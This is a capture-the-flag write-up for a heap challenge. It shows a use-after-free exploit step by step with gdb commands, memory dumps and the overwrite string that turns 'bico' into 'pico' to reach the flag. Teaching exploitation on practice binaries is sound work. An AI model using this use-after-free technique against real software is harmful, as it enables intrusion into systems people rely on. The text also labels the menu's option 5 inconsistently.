# heap 3 #

## Description ##

This program mishandles memory. Can you exploit it to get the flag?
Download the binary here. Download the source [here](chall.c).

Additional details will be available after launching your challenge
instance.

## Hints ##

Check out "use after free"

## Solution ##

In the `init()` procedure dynamically allocates 35 bytes for a `struct object` at
address `x`. After using the **Free x** option in the menu, a new
`malloc()` could reuse that memory block. 

Let's use `gdb` to watch what happens: Start the program in one
terminal, get its PID, and use `gdb --pid PID` in a second terminal. 
First, set a breakpoint at a place `jmp` targets after the menu
choice, and check the memory around `x`:

``` gdb
b *main+143
x /40cb x
```

### Memory at `x` after `init()` ###

	0x7be6b0:       0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
	0x7be6b8:       0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
	0x7be6c0:       0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
	0x7be6c8:       0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        98 'b'  105 'i'
	0x7be6d0:       99 'c'  111 'o' 0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'

### Memory at `x` after `free()` ###

After choosing the menu option 5 for **Free x**, part of the block has
already been overwritten during calls to functions:

	0x7be6b0:       -66 '\276'      7 '\a'  0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
	0x7be6b8:       -47 '\321'      92 '\\' -50 '\316'      -22 '\352'      32 ' '  50 '2'  0 '\000'        110 'n'
	0x7be6c0:       0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
	0x7be6c8:       0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        98 'b'  105 'i'
	0x7be6d0:       99 'c'  111 'o' 0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'

### Memory at `x` after allocating a new block ###

Now let's choose 5 to allocate a new block of memory, and make it the
same size as the `struct object` x pointed to, i.e. 35 bytes, and fill
it with a string such that "bico" is overwritten with "pico". As the
string needs to end with `\0`, this requires 30 arbitrary characters
(except `\0`) plus "pico":

	qwertyuiopasdfghjklzxcvbnm1234pico

Now this looks as wanted:

	0x7be6b0:       113 'q' 119 'w' 101 'e' 114 'r' 116 't' 121 'y' 117 'u' 105 'i'
	0x7be6b8:       111 'o' 112 'p' 97 'a'  115 's' 100 'd' 102 'f' 103 'g' 104 'h'
	0x7be6c0:       106 'j' 107 'k' 108 'l' 122 'z' 120 'x' 99 'c'  118 'v' 98 'b'
	0x7be6c8:       110 'n' 109 'm' 49 '1'  50 '2'  51 '3'  52 '4'  112 'p' 105 'i'
	0x7be6d0:       99 'c'  111 'o' 0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'

Ready to choose menu option 4 and grab the flag.

## Learnings ##

It's important to choose the right size for the new memory block. If
it is too big, the system will have to place it at another address
very likely later in memory.
